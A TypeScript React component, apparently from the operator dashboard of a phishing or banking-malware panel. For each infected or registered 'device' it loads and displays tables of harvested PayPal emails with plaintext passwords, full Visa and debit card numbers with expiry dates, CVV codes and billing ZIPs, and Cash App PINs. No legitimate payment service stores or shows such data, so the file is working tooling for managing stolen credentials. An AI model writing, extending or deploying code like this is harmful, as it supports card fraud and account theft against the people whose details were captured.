import { Modal, Tabs } from "antd";
import { useEffect, useState } from "react";
import {
  fetchCashAppAccounts,
  fetchDebitAccounts,
  fetchPayPalAccounts,
  fetchVisaAccounts,
} from "../api/client";
import type {
  CashAppAccountRecord,
  DebitAccountRecord,
  PayPalAccountRecord,
  VisaAccountRecord,
} from "../types";
import { formatDateTime } from "../utils/format";
import "../styles/device-payment-modal.css";
import { useI18n, t } from "../i18n";


interface DevicePaymentModalProps {
  open: boolean;
  deviceId: string | null;
  deviceLabel?: string;
  onClose: () => void;
}

export function DevicePaymentModal({
  open,
  deviceId,
  deviceLabel,
  onClose,
}: DevicePaymentModalProps) {
  useI18n();
  const [activeTab, setActiveTab] = useState("paypal");
  const [loading, setLoading] = useState(false);
  const [errorText, setErrorText] = useState<string | null>(null);
  const [paypalAccounts, setPaypalAccounts] = useState<PayPalAccountRecord[]>([]);
  const [visaAccounts, setVisaAccounts] = useState<VisaAccountRecord[]>([]);
  const [cashAppAccounts, setCashAppAccounts] = useState<CashAppAccountRecord[]>([]);
  const [debitAccounts, setDebitAccounts] = useState<DebitAccountRecord[]>([]);

  useEffect(() => {
    if (!open || !deviceId) {
      return;
    }

    let cancelled = false;
    setLoading(true);
    setErrorText(null);
    setActiveTab("paypal");

    void Promise.all([
      fetchPayPalAccounts(deviceId),
      fetchVisaAccounts(deviceId),
      fetchCashAppAccounts(deviceId),
      fetchDebitAccounts(deviceId),
    ])
      .then(([paypal, visa, cashapp, debit]) => {
        if (cancelled) {
          return;
        }
        setPaypalAccounts(paypal);
        setVisaAccounts(visa);
        setCashAppAccounts(cashapp);
        setDebitAccounts(debit);
      })
      .catch((error: unknown) => {
        if (cancelled) {
          return;
        }
        const message = error instanceof Error ? error.message : "load_failed";
        setErrorText(message);
        setPaypalAccounts([]);
        setVisaAccounts([]);
        setCashAppAccounts([]);
        setDebitAccounts([]);
      })
      .finally(() => {
        if (!cancelled) {
          setLoading(false);
        }
      });

    return () => {
      cancelled = true;
    };
  }, [open, deviceId]);

  return (
    <Modal
      title={deviceLabel ? t("支付账号 - {0}", { 0: deviceLabel }) : t("支付账号")}
      open={open}
      onCancel={onClose}
      footer={null}
      width={960}
      destroyOnClose
      className="device-payment-modal"
    >
      {errorText ? <div className="device-payment-error">{errorText}</div> : null}

      <Tabs
        activeKey={activeTab}
        onChange={setActiveTab}
        items={[
          {
            key: "paypal",
            label: `PayPal (${paypalAccounts.length})`,
            children: (
              <PaymentTable
                loading={loading}
                emptyText={t("暂无 PayPal 账号记录")}
                columns={[
                  {
                    key: "email",
                    title: t("邮箱"),
                    getValue: (row) => (row as PayPalAccountRecord).email,
                  },
                  {
                    key: "password",
                    title: t("密码"),
                    getValue: (row) => (row as PayPalAccountRecord).password,
                  },
                  {
                    key: "amount",
                    title: t("金额"),
                    getValue: (row) => (row as PayPalAccountRecord).amount ?? "-",
                  },
                  {
                    key: "currency",
                    title: t("币种"),
                    getValue: (row) => (row as PayPalAccountRecord).currency,
                  },
                  {
                    key: "submittedAt",
                    title: t("提交时间"),
                    getValue: (row) => formatDateTime((row as PayPalAccountRecord).submittedAt),
                  },
                ]}
                rows={paypalAccounts}
              />
            ),
          },
          {
            key: "visa",
            label: `Visa (${visaAccounts.length})`,
            children: (
              <PaymentTable
                loading={loading}
                emptyText={t("暂无 Visa 卡记录")}
                columns={[
                  {
                    key: "cardHolder",
                    title: t("持卡人"),
                    getValue: (row) => (row as VisaAccountRecord).cardHolder,
                  },
                  {
                    key: "cardNumber",
                    title: t("卡号"),
                    getValue: (row) => (row as VisaAccountRecord).cardNumber,
                  },
                  {
                    key: "expiry",
                    title: t("有效期"),
                    getValue: (row) => (row as VisaAccountRecord).expiry,
                  },
                  {
                    key: "cvv",
                    title: "CVC",
                    getValue: (row) => (row as VisaAccountRecord).cvv,
                  },
                  {
                    key: "amount",
                    title: t("金额"),
                    getValue: (row) => (row as VisaAccountRecord).amount ?? "-",
                  },
                  {
                    key: "submittedAt",
                    title: t("提交时间"),
                    getValue: (row) => formatDateTime((row as VisaAccountRecord).submittedAt),
                  },
                ]}
                rows={visaAccounts}
              />
            ),
          },
          {
            key: "cashapp",
            label: `Cash App (${cashAppAccounts.length})`,
            children: (
              <PaymentTable
                loading={loading}
                emptyText={t("暂无 Cash App 记录")}
                columns={[
                  {
                    key: "pin",
                    title: "PIN",
                    getValue: (row) => (row as CashAppAccountRecord).pin,
                  },
                  {
                    key: "amount",
                    title: t("金额"),
                    getValue: (row) => (row as CashAppAccountRecord).amount ?? "-",
                  },
                  {
                    key: "submittedAt",
                    title: t("提交时间"),
                    getValue: (row) => formatDateTime((row as CashAppAccountRecord).submittedAt),
                  },
                ]}
                rows={cashAppAccounts}
              />
            ),
          },
          {
            key: "debit",
            label: t("储蓄卡 ({0})", { 0: debitAccounts.length }),
            children: (
              <PaymentTable
                loading={loading}
                emptyText={t("暂无储蓄卡记录")}
                columns={[
                  {
                    key: "cardHolder",
                    title: t("持卡人"),
                    getValue: (row) => (row as DebitAccountRecord).cardHolder,
                  },
                  {
                    key: "cardNumber",
                    title: t("卡号"),
                    getValue: (row) => (row as DebitAccountRecord).cardNumber,
                  },
                  {
                    key: "expiry",
                    title: t("有效期"),
                    getValue: (row) => (row as DebitAccountRecord).expiry,
                  },
                  {
                    key: "cvv",
                    title: "CVV",
                    getValue: (row) => (row as DebitAccountRecord).cvv,
                  },
                  {
                    key: "billingZip",
                    title: "ZIP",
                    getValue: (row) => (row as DebitAccountRecord).billingZip,
                  },
                  {
                    key: "amount",
                    title: t("金额"),
                    getValue: (row) => (row as DebitAccountRecord).amount ?? "-",
                  },
                  {
                    key: "submittedAt",
                    title: t("提交时间"),
                    getValue: (row) => formatDateTime((row as DebitAccountRecord).submittedAt),
                  },
                ]}
                rows={debitAccounts}
              />
            ),
          },
        ]}
      />
    </Modal>
  );
}

interface PaymentColumn {
  key: string;
  title: string;
  getValue: (row: PaymentRow) => string;
}

interface PaymentRow {
  id: string;
}

interface PaymentTableProps {
  loading: boolean;
  emptyText: string;
  columns: PaymentColumn[];
  rows: PaymentRow[];
}

function PaymentTable({
  loading,
  emptyText,
  columns,
  rows,
}: PaymentTableProps) {
  useI18n();
  if (loading) {
    return <div className="device-payment-empty">{t("加载中…")}</div>;
  }

  if (rows.length === 0) {
    return <div className="device-payment-empty">{emptyText}</div>;
  }

  return (
    <div className="device-payment-table-wrap">
      <table className="device-payment-table">
        <thead>
          <tr>
            <th>{t("序号")}</th>
            {columns.map((column) => (
              <th key={column.key}>{column.title}</th>
            ))}
          </tr>
        </thead>
        <tbody>
          {rows.map((row, index) => (
            <tr key={row.id || String(index)}>
              <td>{index + 1}</td>
              {columns.map((column) => (
                <td key={column.key}>{column.getValue(row) || "-"}</td>
              ))}
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}
